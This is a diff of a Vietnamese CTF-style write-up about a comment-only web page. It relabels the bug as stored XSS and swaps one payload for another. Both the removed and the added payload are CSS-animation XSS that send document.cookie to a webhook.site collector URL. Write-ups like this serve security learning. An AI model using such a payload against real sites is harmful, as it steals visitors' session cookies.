@@ -7,7 +7,7 @@ For prompt resolution :))
 
 Trang web chỉ có một chức năng duy nhất là Post một comment lên. Mình không tìm thấy chức năng nào khác nữa.
 
-Đến đây thì mình đoán ngay đây là dạng lỗ hỏng XSS.
+Đến đây thì mình đoán ngay đây là dạng lỗ hỏng Stored XSS.
 
 ![[Pasted image 20261014164503.png]]
 
@@ -27,5 +27,6 @@ Giờ mình đổi
 https://webhook.site/da9264dd-dd7f-4d06-998c-101ab2607e66
 
 ```html
-<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationend="location = 'https://webhook.site/da9264dd-dd7f-4d06-998c-101ab2607e66/'+document.cookie"></h1>
+<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationend="fetch('https://webhook.site/da9264dd-dd7f-4d06-998c-101ab2607e66/'+document.cookie)"></h1>
 ```
+![[Pasted image 20261014170903.png]]
